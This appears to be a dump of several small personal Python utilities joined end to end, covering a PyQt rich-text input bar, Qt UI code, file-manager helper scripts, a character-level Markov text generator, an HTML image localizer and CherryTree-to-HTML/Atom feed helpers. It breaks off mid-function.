        size_policy = QtWidgets.QSizePolicy(QtWidgets.QSizePolicy.Preferred,
                                            QtWidgets.QSizePolicy.Maximum)
        size_policy.setHorizontalStretch(0)
        size_policy.setVerticalStretch(0)
        size_policy.setHeightForWidth(tool_bar.sizePolicy().hasHeightForWidth())
        tool_bar.setSizePolicy(size_policy)
        tool_bar.setMinimumSize(QtCore.QSize(0, 32))
        tool_bar.setMovable(False)
        tool_bar.setFloatable(False)
        tool_bar.setObjectName("tool_bar")

        main_window.addToolBar(QtCore.Qt.TopToolBarArea, tool_bar)

        return tool_bar

    @property
    def active_input_bar(self):
        return self.main_window.input_bar

    def sub_element_clicked(self, event):
        self.set_proper_toolbar()

    def mousePressEvent(self, event):
        self.set_proper_toolbar()
        super().mousePressEvent(event)

    def set_proper_toolbar(self):
        self.main_window.set_active_input_bar(self)

    def register_toolbar(self, active_toolbar):
        if InputBar.toolbar and InputBar.toolbar is active_toolbar:
            return

        if InputBar.toolbar:
            active_toolbar.hide()
            InputBar.toolbar.show()
            return

        if active_toolbar:
            active_toolbar.hide()

        InputBar.toolbar = self.add_toolbar(self.main_window)

        bold_icon = QAction(QIcon('resources/icons/bold.png'), 'Bold', self)
        settings.add_shortcut("bold_text", "Ctrl+b", bold_icon)
        bold_icon.triggered.connect(lambda x: self.active_input_bar.on_toolbar_bold_clicked(x))
        InputBar.toolbar.addAction(bold_icon)

        italic_icon = QAction(QIcon('resources/icons/italic.png'), 'Italic', self)
        settings.add_shortcut("italic_text", "Ctrl+i", italic_icon)
        italic_icon.triggered.connect(lambda x: self.active_input_bar.on_toolbar_italic_clicked(x))
        InputBar.toolbar.addAction(italic_icon)

        underlined_icon = QAction(QIcon('resources/icons/underlined.png'), 'Underlined', self)
        settings.add_shortcut("underlined_text", "Ctrl+u", underlined_icon)
        underlined_icon.triggered.connect(lambda x: self.active_input_bar.on_toolbar_underlined_clicked(x))
        InputBar.toolbar.addAction(underlined_icon)

        date_icon = QAction(QIcon('resources/icons/date.png'), 'Add date object', self)
        # date_icon.setShortcut('Ctrl+i')  # TODO: set dynamically from settings
        date_icon.triggered.connect(lambda x: self.active_input_bar.on_toolbar_date_clicked(x))
        InputBar.toolbar.addAction(date_icon)

        datetime_icon = QAction(QIcon('resources/icons/datetime.png'), 'Add datetime object', self)
        # datetime_icon.setShortcut('Ctrl+i')  # TODO: set dynamically from settings
        datetime_icon.triggered.connect(lambda x: self.active_input_bar.on_toolbar_datetime_clicked(x))
        InputBar.toolbar.addAction(datetime_icon)

        InputBar.toolbar.setIconSize(QtCore.QSize(32, 32))

    def on_toolbar_bold_clicked(self, event):
        if self.wysiwyg_widget.fontWeight() == QFont.Bold:
            self.wysiwyg_widget.setFontWeight(QFont.Normal)
        else:
            self.wysiwyg_widget.setFontWeight(QFont.Bold)

    def on_toolbar_italic_clicked(self, event):
        self.wysiwyg_widget.setFontItalic(not self.wysiwyg_widget.fontItalic())

    def on_toolbar_underlined_clicked(self, event):
        self.wysiwyg_widget.setFontUnderline(not self.wysiwyg_widget.fontUnderline())

    def on_toolbar_date_clicked(self, event):
        print("on_toolbar_date_clicked")

        self.widget = QLineEdit(self.wysiwyg_widget)
        self.widget.setText('QLineEdit instance')
        self.widget.hide()

        self.insert_widget(self.wysiwyg_widget.textCursor(), self.widget)

    def on_toolbar_datetime_clicked(self, event):
        print("on_toolbar_datetime_clicked")
        self.widget.setText("blah")
        self.wysiwyg_widget.viewport().update()
#! /usr/bin/env python3
from PyQt5 import QtCore

from PyQt5.QtGui import QPen
from PyQt5.QtGui import QTextCursor
from PyQt5.QtGui import QTextFormat
from PyQt5.QtGui import QTextCharFormat
from PyQt5.QtGui import QTextObjectInterface

from PyQt5.QtCore import Qt
from PyQt5.QtCore import QObject

from PyQt5.QtWidgets import QWidget


class InlinedWidgetInfo:
    object_replacement_character = chr(0xfffc)
    _instance_counter = 0

    def __init__(self, widget):
        self.widget = widget

        self.text_format_id = QTextFormat.UserObject + InlinedWidgetInfo._instance_counter
        self.char = self.object_replacement_character

        InlinedWidgetInfo._instance_counter += 1


class EmbeddedWidgetHandler(QWidget):
    def __init__(self, parent):
        super().__init__(parent)
        self.text_format_id_to_inlined_widget_map = {}
        self.last_text_lenght = 0

    def connect_signals(self):
        self.editor_widget.currentCharFormatChanged.connect(self.on_character_format_change)
        self.editor_widget.selectionChanged.connect(self._trigger_obj_char_rescan)
        self.editor_widget.textChanged.connect(self.on_text_changed)

    @property
    def editor_widget(self):
        """
        Returns:
            QTextWidget: Instance of the QTextWidget.
        """
        raise NotImplementedError("Override .editor_widget property to return QTextWidget.")

    def insert_widget(self, cursor, widget):
        inlined_widget_wrapper = InlinedWidgetInfo(widget)
        self._wrap_with_text_object(inlined_widget_wrapper)
        self._insert_text_object(cursor, inlined_widget_wrapper)
        self.editor_widget.setTextCursor(cursor)

    def _wrap_with_text_object(self, inlined_widget):
        class TextObject(QObject, QTextObjectInterface):
            def intrinsicSize(self, doc, pos_in_document, format):
                return QtCore.QSizeF(inlined_widget.widget.sizeHint())

            def drawObject(_self, painter, rect, doc, pos_in_document, format):
                inlined_widget.widget.resize(inlined_widget.widget.sizeHint())
                painter.setPen(QPen(Qt.white))
                painter.drawRect(rect)
                inlined_widget.widget.move(rect.x(), rect.y())

        document_layout = self.editor_widget.document().documentLayout()
        document_layout.registerHandler(inlined_widget.text_format_id, TextObject(self))
        self.text_format_id_to_inlined_widget_map[inlined_widget.text_format_id] = inlined_widget

    def _insert_text_object(self, cursor, inlined_widget):
        char_format = QTextCharFormat()
        char_format.setObjectType(inlined_widget.text_format_id)
        cursor.insertText(inlined_widget.char, char_format)
        inlined_widget.widget.show()

    def on_character_format_change(self, qtextcharformat):
        text_format_id = qtextcharformat.objectType()

        # id 0 is used when the object is deselected - I don't really want the id
        # itself, I just want to know that there was some change AFTER it was done
        if text_format_id == 0:
            self._trigger_obj_char_rescan()

    def on_text_changed(self):
        current_text_lenght = len(self.editor_widget.toPlainText())
        if self.last_text_lenght > current_text_lenght:
            self._trigger_obj_char_rescan()

        self.last_text_lenght = current_text_lenght

    def _trigger_obj_char_rescan(self):
        text = self.editor_widget.toPlainText()
        character_indexes = [
            cnt for cnt, char in enumerate(text)
            if char == InlinedWidgetInfo.object_replacement_character
        ]

        # get text_format_id for all OBJECT REPLACEMENT CHARACTERs
        present_text_format_ids = set()
        for index in character_indexes:
            cursor = QTextCursor(self.editor_widget.document())

            # I have to create text selection in order to detect correct character
            cursor.setPosition(index)
            if index < len(text):
                cursor.setPosition(index + 1, QTextCursor.KeepAnchor)

            text_format_id = cursor.charFormat().objectType()

            present_text_format_ids.add(text_format_id)

        # diff for characters that are there and that should be there
        expected_text_format_ids = set(self.text_format_id_to_inlined_widget_map.keys())
        removed_text_ids = expected_text_format_ids - present_text_format_ids

        # hide widgets for characters that were removed
        for text_format_id in removed_text_ids:
            inlined_widget = self.text_format_id_to_inlined_widget_map[text_format_id]
            inlined_widget.widget.hide()
            del self.text_format_id_to_inlined_widget_map[text_format_id]
# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'basic_input.ui'
#
# Created by: PyQt5 UI code generator 5.10.1
#
# WARNING! All changes made in this file will be lost!

from PyQt5 import QtCore, QtGui, QtWidgets

class Ui_InputBar(object):
    def setupUi(self, InputBar):
        InputBar.setObjectName("InputBar")
        InputBar.resize(537, 44)
        self.gridLayout = QtWidgets.QGridLayout(InputBar)
        self.gridLayout.setContentsMargins(0, 0, 0, 0)
        self.gridLayout.setObjectName("gridLayout")
        self.horizontalLayout = QtWidgets.QHBoxLayout()
        self.horizontalLayout.setSpacing(0)
        self.horizontalLayout.setObjectName("horizontalLayout")
        self.verticalLayout = QtWidgets.QVBoxLayout()
        self.verticalLayout.setSizeConstraint(QtWidgets.QLayout.SetFixedSize)
        self.verticalLayout.setContentsMargins(-1, 0, -1, -1)
        self.verticalLayout.setSpacing(0)
        self.verticalLayout.setObjectName("verticalLayout")
        self.button_add = QtWidgets.QPushButton(InputBar)
        self.button_add.setMaximumSize(QtCore.QSize(20, 20))
        self.button_add.setObjectName("button_add")
        self.verticalLayout.addWidget(self.button_add)
        self.button_move = QtWidgets.QPushButton(InputBar)
        self.button_move.setEnabled(True)
        self.button_move.setMaximumSize(QtCore.QSize(20, 20))
        self.button_move.setObjectName("button_move")
        self.verticalLayout.addWidget(self.button_move)
        spacerItem = QtWidgets.QSpacerItem(0, 0, QtWidgets.QSizePolicy.Minimum, QtWidgets.QSizePolicy.Expanding)
        self.verticalLayout.addItem(spacerItem)
        self.horizontalLayout.addLayout(self.verticalLayout)
        self.wysiwyg_widget = WYSIWYGInput(InputBar)
        sizePolicy = QtWidgets.QSizePolicy(QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Ignored)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(self.wysiwyg_widget.sizePolicy().hasHeightForWidth())
        self.wysiwyg_widget.setSizePolicy(sizePolicy)
        self.wysiwyg_widget.setFrameShadow(QtWidgets.QFrame.Plain)
        self.wysiwyg_widget.setLineWidth(0)
        self.wysiwyg_widget.setVerticalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.wysiwyg_widget.setHorizontalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.wysiwyg_widget.setSizeAdjustPolicy(QtWidgets.QAbstractScrollArea.AdjustToContents)
        self.wysiwyg_widget.setObjectName("wysiwyg_widget")
        self.horizontalLayout.addWidget(self.wysiwyg_widget)
        self.gridLayout.addLayout(self.horizontalLayout, 0, 0, 1, 1)

        self.retranslateUi(InputBar)
        QtCore.QMetaObject.connectSlotsByName(InputBar)

    def retranslateUi(self, InputBar):
        _translate = QtCore.QCoreApplication.translate
        InputBar.setWindowTitle(_translate("InputBar", "InputBar"))
        self.button_add.setText(_translate("InputBar", "+"))
        self.button_move.setText(_translate("InputBar", "⋮"))

from widgets.wysiwyg_input import WYSIWYGInput
#! /usr/bin/env python3
from PyQt5.QtGui import *
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtPrintSupport import *

import os
import sys
import uuid


FONT_SIZES = [7, 8, 9, 10, 11, 12, 13, 14, 18, 24, 36, 48, 64, 72, 96, 144, 288]
IMAGE_EXTENSIONS = ['.jpg','.png','.bmp']
HTML_EXTENSIONS = ['.htm', '.html']


def hexuuid():
    return uuid.uuid4().hex

def splitext(p):
    return os.path.splitext(p)[1].lower()


class WYSIWYGInput(QTextEdit):
    def __init__(self, parent):
        super().__init__(parent)

        self.input_bar = parent

    def mousePressEvent(self, event):
        self.input_bar.sub_element_clicked(event)

        super().mousePressEvent(event)

    def canInsertFromMimeData(self, source):
        if source.hasImage():
            return True
        else:
            return super().canInsertFromMimeData(source)

    def insertFromMimeData(self, source):
        cursor = self.textCursor()
        document = self.document()

        if source.hasUrls():
            for u in source.urls():
                file_ext = splitext(str(u.toLocalFile()))

                if u.isLocalFile() and file_ext in IMAGE_EXTENSIONS:
                    image = QImage(u.toLocalFile())
                    document.addResource(QTextDocument.ImageResource, u, image)
                    cursor.insertImage(u.toLocalFile())

                else:
                    # If we hit a non-image or non-local URL break the loop and fall out
                    # to the super call & let Qt handle it
                    break

            else:
                # If all were valid images, finish here.
                return

        elif source.hasImage():
            image = source.imageData()
            uuid = hexuuid()
            document.addResource(QTextDocument.ImageResource, uuid, image)
            cursor.insertImage(uuid)
            return

        super().insertFromMimeData(source)
# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'main_window.ui'
#
# Created by: PyQt4 UI code generator 4.12.1
#
# WARNING! All changes made in this file will be lost!

from PyQt4 import QtCore, QtGui

try:
    _fromUtf8 = QtCore.QString.fromUtf8
except AttributeError:
    def _fromUtf8(s):
        return s

try:
    _encoding = QtGui.QApplication.UnicodeUTF8
    def _translate(context, text, disambig):
        return QtGui.QApplication.translate(context, text, disambig, _encoding)
except AttributeError:
    def _translate(context, text, disambig):
        return QtGui.QApplication.translate(context, text, disambig)

class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName(_fromUtf8("MainWindow"))
        MainWindow.resize(853, 776)
        self.centralwidget = QtGui.QWidget(MainWindow)
        self.centralwidget.setObjectName(_fromUtf8("centralwidget"))
        self.gridLayout = QtGui.QGridLayout(self.centralwidget)
        self.gridLayout.setObjectName(_fromUtf8("gridLayout"))
        self.horizontalLayout = QtGui.QHBoxLayout()
        self.horizontalLayout.setSizeConstraint(QtGui.QLayout.SetDefaultConstraint)
        self.horizontalLayout.setObjectName(_fromUtf8("horizontalLayout"))
        self.image_list = QtGui.QListWidget(self.centralwidget)
        self.image_list.setMaximumSize(QtCore.QSize(130, 16777215))
        self.image_list.setObjectName(_fromUtf8("image_list"))
        self.horizontalLayout.addWidget(self.image_list)
        self.image_view = QtGui.QGraphicsView(self.centralwidget)
        self.image_view.setObjectName(_fromUtf8("image_view"))
        self.horizontalLayout.addWidget(self.image_view)
        self.gridLayout.addLayout(self.horizontalLayout, 0, 0, 1, 1)
        self.frame = QtGui.QFrame(self.centralwidget)
        self.frame.setMinimumSize(QtCore.QSize(80, 0))
        self.frame.setFrameShape(QtGui.QFrame.StyledPanel)
        self.frame.setFrameShadow(QtGui.QFrame.Raised)
        self.frame.setObjectName(_fromUtf8("frame"))
        self.gridLayout_2 = QtGui.QGridLayout(self.frame)
        self.gridLayout_2.setObjectName(_fromUtf8("gridLayout_2"))
        self.verticalLayout = QtGui.QVBoxLayout()
        self.verticalLayout.setObjectName(_fromUtf8("verticalLayout"))
        self.pushButton_2 = QtGui.QPushButton(self.frame)
        self.pushButton_2.setObjectName(_fromUtf8("pushButton_2"))
        self.verticalLayout.addWidget(self.pushButton_2)
        self.pushButton = QtGui.QPushButton(self.frame)
        self.pushButton.setObjectName(_fromUtf8("pushButton"))
        self.verticalLayout.addWidget(self.pushButton)
        spacerItem = QtGui.QSpacerItem(20, 40, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Expanding)
        self.verticalLayout.addItem(spacerItem)
        self.gridLayout_2.addLayout(self.verticalLayout, 0, 0, 1, 1)
        self.gridLayout.addWidget(self.frame, 0, 1, 1, 1)
        MainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QtGui.QMenuBar(MainWindow)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 853, 20))
        self.menubar.setObjectName(_fromUtf8("menubar"))
        MainWindow.setMenuBar(self.menubar)
        self.statusbar = QtGui.QStatusBar(MainWindow)
        self.statusbar.setObjectName(_fromUtf8("statusbar"))
        MainWindow.setStatusBar(self.statusbar)

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        MainWindow.setWindowTitle(_translate("MainWindow", "MainWindow", None))
        self.pushButton_2.setText(_translate("MainWindow", "PushButton", None))
        self.pushButton.setText(_translate("MainWindow", "PushButton", None))

#! /usr/bin/env python3
import os
import sys
import os.path
import argparse

from PyQt4 import Qt
from PyQt4 import QtGui
from PyQt4 import QtCore

from PIL import Image, ImageQt
from PyQt4.QtCore import QSize
from PyQt4.QtGui import QListWidgetItem, QPixmap, QIcon

from resources.main_window import Ui_MainWindow


def load_thumbs_of_all_images(dir_path):
    for fn in os.listdir(dir_path):
        if fn.lower().rsplit(".", 1)[-1] not in ["jpg", "png"]:
            continue

        path = os.path.join(dir_path, fn)

        im = Image.open(path)
        im.thumbnail((100, 100), Image.ANTIALIAS)

        icon = QIcon(QPixmap.fromImage(ImageQt.ImageQt(im)))
        item = QListWidgetItem()
        item.setStatusTip(path)
        item.setIcon(icon)

        yield im.width, im.height, item


class GUISemiAutoCropper(QtGui.QMainWindow, Ui_MainWindow):
    def __init__(self, path, parent=None):
        super(GUISemiAutoCropper, self).__init__(parent)
        self.setupUi(self)

        self.path = path

        for w, h, item in load_thumbs_of_all_images(path):
            self.image_list.setIconSize(QSize(w, h))
            self.image_list.addItem(item)




if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "PATH",
        help="Path to the directory with pictures."
    )
    args = parser.parse_args()

    app = QtGui.QApplication(sys.argv)
    gui = GUISemiAutoCropper(args.PATH)
    gui.show()

    sys.exit(app.exec_())
#! /usr/bin/env python3


#! /usr/bin/env python3


#! /usr/bin/env python3


#! /usr/bin/env python3
import sys
import json
from random import random
from collections import Counter
from collections import defaultdict


def normalize(counter):
    s = float(
        sum(counter.values())
    )

    return [
        (char, cnt/s)
        for char, cnt in counter.items()
    ]


def train_char_model(data, order=4):
    raw_model = defaultdict(Counter)

    pad = "~" * order
    data = pad + data
    for i in range(len(data) - order):
        char = data[i+order]
        history = data[i:i+order]

        raw_model[history][char] += 1

    return {
        hist: normalize(chars)
        for hist, chars in raw_model.items()
    }


def generate_letter(model, history, order):
    history = history[-order:]
    dist = model[history]

    x = random()
    for char, prob in dist:
        x = x - prob
        if x <= 0:
            return char


def generate_text(model, order, nletters=1000):
    history = "~" * order

    out = []
    for i in range(nletters):
        c = generate_letter(model, history, order)
        history = history[-order:] + c
        out.append(c)

    return "".join(out)


if __name__ == '__main__':
    order = 4
    c_model = train_char_model(open("c_dataset.txt").read(), order)
    with open("c_model.json", "w") as f:
        f.write(json.dumps(model))

    c_model = train_char_model(open("py_dataset.txt").read(), order)
    with open("py_model.json", "w") as f:
        f.write(json.dumps(model))

    # print(generate_text(model, order, nletters=2000))#! /usr/bin/env python3


#! /usr/bin/env python2
import os
import sys
import os.path

import sh


if __name__ == '__main__':
    files = os.environ.get("NEMO_SCRIPT_SELECTED_FILE_PATHS", "").strip()

    if not files:
        sys.exit(1)

    for fn in files.splitlines():
        dirname = os.path.dirname(fn)
        os.chdir(dirname)

        sh.md5it(os.path.basename(fn))
#! /usr/bin/env python2
import os
import urllib
import os.path

import tkMessageBox

import sh


PUBLIC_SYNC_DIR = os.path.expanduser("~/Plocha/Syncthing/public/")
HTTP_PATH = "http://kitakitsune.org/sync/%s"


def replace_sync_path(fn):
    if PUBLIC_SYNC_DIR in fn:
        return fn.replace(PUBLIC_SYNC_DIR, "")

    return os.path.basename(fn)


def url_encode_parts(fn):
    return "/".join(
        urllib.quote(x)
        for x in fn.split("/")
    )


if __name__ == '__main__':
    files = os.environ.get("NEMO_SCRIPT_SELECTED_FILE_PATHS", "").strip()

    if not files:
        files = os.environ.get("CAJA_SCRIPT_SELECTED_FILE_PATHS", "").strip()

    if not files:
        tkMessageBox.showerror(
            "Error!",
            "You have to select at least one file!"
        )

    for fn in files.splitlines():
        fn = replace_sync_path(fn)

        link = HTTP_PATH % url_encode_parts(fn)
        sh.xclip(sh.echo("-n", link), "-selection", "clipboard")
        sh.notify_send("Link for %s copied to clipboard." % link)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
"""
Picture localizer.

This script allows you to move all pictures referenced in HTML document into
the same directory as the HTML document.

It is useful, if you need to upload the document somewhere with all the pictures
from the internet/your disk.
"""
#= Imports ====================================================================
import sys
import shutil
import os.path
from md5 import md5

from httpkie import Downloader
import dhtmlparser as d


#= Variables ==================================================================
ALLOWED_IMAGES = [
    "jpg",
    "jpeg",
    "gif",
    "png"
]


#= Functions & objects ========================================================
def localize_image(path, out_dir):
    new_path = out_dir + "/" + os.path.basename(path)

    if path.startswith("http://") or path.startswith("https://"):
        local_name = "/tmp/pic_" + os.path.basename(path).replace("/", "")
        with open(local_name, "wb") as f:
            f.write(Downloader().download(path))
        path = local_name

    if not os.path.exists(path):
        return path

    if os.path.exists(new_path):
        path_md5 = md5(open(path).read()).hexdigest()
        new_path_md5 = md5(open(new_path).read()).hexdigest()

        if path_md5 != new_path_md5:
            while os.path.exists(new_path):
                suffix = new_path.rsplit(".", 1)[1]
                new_path = md5(os.path.basename(new_path)).hexdigest()
                new_path = out_dir + "/" + new_path + "." + suffix

    if not os.path.exists(new_path):
        if path.startswith("http://") or path.startswith("https://"):
            with open(new_path, "wb") as f:
                f.write(Downloader().download(path))
        else:
            shutil.copy(path, new_path)

    return "./" + os.path.basename(new_path)


#= Main program ===============================================================
if __name__ == '__main__':
    if len(sys.argv) == 1 or not os.path.exists(sys.argv[1]):
        sys.stderr.write(
            "Image localizer\nUsage:\n\t%s file.html\n" % sys.argv[0]
        )
        sys.exit()
    abs_path = os.path.abspath(sys.argv[1])

    data = None
    with open(abs_path) as f:
        data = f.read()

    dom = d.parseString(data)

    # get name for the output directory
    out_dir = dom.find("title")
    if out_dir:
        out_dir = out_dir[0].getContent().strip().replace("/", "")
    else:
        out_dir = os.path.basename(sys.argv[1]).rsplit(".", 1)[0]

    # create output directory
    if not os.path.exists(out_dir):
        os.mkdir(out_dir)

    # localize inlined images
    for img in dom.find("img"):
        if "src" not in img.params:
            continue

        img.params["src"] = localize_image(img.params["src"], out_dir)

    # localize linked images
    for a in dom.find("a"):
        if "href" not in a.params or "." not in a.params["href"]:
            continue

        if a.params["href"].rsplit(".", 1)[1].lower() not in ALLOWED_IMAGES:
            continue

        a.params["href"] = localize_image(a.params["href"], out_dir)

    with open(out_dir + "/" + os.path.basename(abs_path), "wt") as f:
        f.write(str(dom))
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0
# Unported License (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import sys


# this will work everywhere and exactly how i want, not like print / print()
def write(s, out=sys.stdout):
    out.write(str(s))
    out.flush()


def writeln(s, out=sys.stdout):
    write(str(s) + "\n", out)


try:
    from dhtmlparser import *
except ImportError:
    writeln("\nThis script require dhtmlparser.", sys.stderr)
    writeln("> https://github.com/Bystroushaak/pyDHTMLParser <\n", sys.stderr)
    sys.exit(1)
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0
# Unported License (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import os.path
import hashlib
from string import Template


import parser as d
from parser import writeln
from converttohtml import convertToHtml


#= Variables ==================================================================
HTML_ENTITIES = {
    "&lt;": "<",
    "&gt;": ">",
    "&quot;": '"'
}
SPECIAL_NODENAMES = ["__CSS", "__RSS", "__TEMPLATE"]
ATOM_ENTRY_TEMPLATE = """
    <entry>
        <title>$title</title>
        <link href="$url"/>
        <id>http://$uid/</id>
        <updated>$updated</updated>
        <content type="html">$content</content>
    </entry>
"""


#= Functions & objects ========================================================
def _getFirstNodeByCIName(dom, nodename):
    "find RSS nodes (case insensitive)"
    out_node = dom.find(
        "",
        fn=lambda x:
            x.getTagName() == "node" and
            "name" in x.params and
            x.params["name"].lower() == nodename.lower()
    )

    if len(out_node) <= 0:
        return None

    return out_node[0]


def _getUserTemplate(dom, name):
    """"
    Return users template identified by name (case insensitive).

    Template is then converted to html.

    Returns: (template_node, html_content)
    """
    template_node = _getFirstNodeByCIName(dom, name)

    # don't continue, if there is no rss node
    if template_node is None:
        return (None, None)

    html_content = d.parseString(
        convertToHtml(dom, template_node.params["unique_id"])
    )

    # preprocess content
    content = html_content.getContent().replace("<p></p>", "").strip()
    for key, val in HTML_ENTITIES.iteritems():
        content = content.replace(val, key)

    return (template_node, html_content)


# lame, i know..
def _removeHTMLEntities(s):
    for key, val in HTML_ENTITIES.iteritems():
        s = s.replace(key, val)

    return s


def getUserCodeboxTemplate(dom, name):
    """"
    Check if there is node called |name|. If there is, return first codebox from
    that node.
    """
    template_node, template_html = _getUserTemplate(dom, name)

    if template_node is None:
        return None
    template = template_node.find("codebox")

    if template:
        template = template[0].getContent()
    else:
        template = template_node.find("rich_text")[0].getContent()

    template = _removeHTMLEntities(template)

    # remove whole node from document
    template_node.replaceWith(d.HTMLElement(""))

    return template


def saveUserCSS(html_template, css, out_dir):
    """"
    Save |css|.
    Try parse filename from |html_template|, if there is proper
    <link rel='stylesheet'> tag.
    Default "style.css".
    """
    dom = d.parseString(html_template)
    css_name = dom.find("link", {"rel": "stylesheet"})

    if not css_name:
        css_name = "style.css"
    else:
        css_name = css_name[0]
        css_name = css_name.params.get("href", "style.css")

    css_name = os.path.basename(css_name)

    with open(out_dir + "/" + css_name, "wt") as fh:
        fh.write(css)


def removeSpecialNodenames(dom):
    special_nodes = dom.find(
        "",
        fn=lambda x:
            x.getTagName() == "node" and
            "name" in x.params and
            x.params["name"].startswith("__") and
            x.params["name"].upper() not in SPECIAL_NODENAMES
    )

    # remove matching nodes
    for special_node in special_nodes:
        special_node.replaceWith(d.HTMLElement(""))


# TODO: this needs refactoring
def generateAtomFeed(dom, out_dir):
    rss_node = _getFirstNodeByCIName(dom, "__rss")

    # don't continue, if there is no rss node
    if rss_node is None:
        return None

    # iterate thru feed records
    first = True
    entries = ""
    update_times = []
    for node in rss_node.find("node"):
        # skip first iteration (main node containing information about feed)
        if first:
            first = False
            continue

        # convert node from rich_text to html
        html_node = d.parseString(convertToHtml(dom, node.params["unique_id"]))

        if len(html_node.find("a")) > 0:
            first_link = html_node.find("a")[0]
        else:
            raise ValueError(
                "Item '" +
                node.params["name"] +
                "' doesn't have date and/or URL!"
            )

        updated = first_link.getContent()

        # get url from first link, or set it to default
        url = first_link.params["href"] if "href" in first_link.params else ""
        url = "./" + url[5:] if url.startswith("./../") and len(url) > 5 else url

        # remove first link (and it's content) from html code
        if first_link is not None:
            first_link.replaceWith(d.HTMLElement(""))

        # preprocess content
        content = html_node.getContent().replace("<p></p>", "").strip()
        for key, val in HTML_ENTITIES.iteritems():
            content = content.replace(val, key)

        entries += Template(ATOM_ENTRY_TEMPLATE).substitute(
            title=node.params["name"],
            url=url,
            uid=hashlib.md5(
                node.params["name"] +
                str(url) +
                str(updated)
            ).hexdigest(),
            updated=updated,
            content=content
        )

        update_times.append(updated)

        # remove node from DOM
        node.replaceWith(d.HTMLElement(""))

    # extract Atom template from .ctd
    atom_template = rss_node.find("codebox")
    if len(atom_template) <= 0:
        raise ValueError("There is no codebox with Atom template!")
    atom_template = atom_template[0].getContent()

    atom_template = _removeHTMLEntities(atom_template)

    atom_feed = Template(atom_template).substitute(
        updated=update_times[0],
        entries=entries
    )

    # get feed's filename - it is specified in atom template
    filename = d.parseString(atom_feed).find("link")
    if len(filename) <= 0:
        raise ValueError("There has to be link in your Atom template!")
    filename = filename[0]

    if not "href" in filename.params:
        raise ValueError(
            "Link in your Atom template has to have 'href' parameter!"
        )
    filename = filename.params["href"].split("/")[-1]

    if "." not in filename:
        filename = "atom.xml"
        writeln(
            "You didn't specified filename of your feed, so I choosed " +
            "'%s'" % (filename)
        )

    fh = open(out_dir + "/" + filename, "wt")
    fh.write(atom_feed)
    fh.close()

    # get rid of RSS node
    rss_node.replaceWith(d.HTMLElement(""))
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0
# Unported License (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import re

import parser as d


#= Functions ==================================================================
def unlinkFromParent(el):
    "Unlink element from parent."

    if (el.parent is not None) and (el in el.parent.childs):
        i = el.parent.childs.index(el)
        if i >= 0:
            del el.parent.childs[i]


def replaceInParent(el, new_el):
    "Replace element in parent.childs."

    if (el.parent is not None) and (el in el.parent.childs):
        el.parent.childs[el.parent.childs.index(el)] = new_el


def elementToP(el):
    """
    Convert one element to <p>el</p>. Element is changed in parent.
    Returns element (if you don't need it, just drop it, everything is
    changed in right place in parent already.)
    """

    p = d.HTMLElement("<p>")

    p.childs.append(el)

    # for double linked lists
    if el.parent is not None:
        p.parent = el.parent
        replaceInParent(el, p)
        el.parent = p

    p.endtag = d.HTMLElement("</p>")

    return p


def elementsToP(els):
    """
    Put array of elements into <p>. Result is put into els.parent, so you
    can just call this and don't care about rest.

    Returns <p>els[:]</p>, just if you needed it.
    """
    if len(els) == 0:
        return

    p = elementToP(els[0])

    if len(els) > 1:
        p.childs.extend(els[1:])

        for e in els[1:]:
            unlinkFromParent(e)
            e.parent = p

    return p


def __processBuffer(buff):
    "Convert array of elements in buff to paragraphs."

    p_stack = [[]]
    for el in buff:
        content = el.getContent() if el.isTag() else str(el)

        # content without \n\n is just regular part of <p>
        if not "\n\n" in content:
            if "\n" in content:
                nel = d.parseString(str(el))#.replace("\n", "<br />\n"))
                nel.parent = el.parent
                el.replaceWith(nel)
            p_stack[-1].append(el)
            continue

        if el.isTag():
            __processBuffer(el.childs)
        else:
            # split by \n\n and convert it to tags
            tmp = map(
                # support for <br>
                lambda x: d.HTMLElement(x),
                # lambda x: d.HTMLElement(x.replace("\n", "<br />\n")),
                content.split("\n\n")
            )

            # new tags are moved into blank container
            # original element is then replaced by this blank container
            repl = d.HTMLElement("")
            repl.childs = tmp
            el.replaceWith(repl)

            # elements must have parents
            for i in tmp:
                i.parent = el

            if len(tmp) == 0:
                p_stack.append([])
                continue

            # first element is part of previous <p>
            p_stack[-1].append(tmp[0])
            tmp = tmp[1:] if len(tmp) > 1 else []
            # ^ del tmp[0] <- this tends to delete object in tmp[0] .. wtf?

            # other elements are new <p>s by itself
            for i in tmp:
                p_stack.append([i])

    # convert stack of elements to <p>
    for p in p_stack:
        elementsToP(p)


def guessParagraphs(s, dont_wrap=["h1", "h2", "h3", "pre", "center", "table"]):
    # parse string and make it double-linked tree
    node = d.parseString(s)
    d.makeDoubleLinked(node)

    # get all elements between <hx> (headers) - they will be converted to
    # <p>aragraphs
    tmp = []
    buffs = []
    for el in node.childs[0].childs:
        if el.getTagName().lower() in dont_wrap and not el.isEndTag():
            buffs.append(tmp)
            tmp = []
        else:
            tmp.append(el)
    buffs.append(tmp)

    # process paragraphs
    for buff in buffs:
        __processBuffer(buff)

    # remove blank <p>aragraphs
    map(
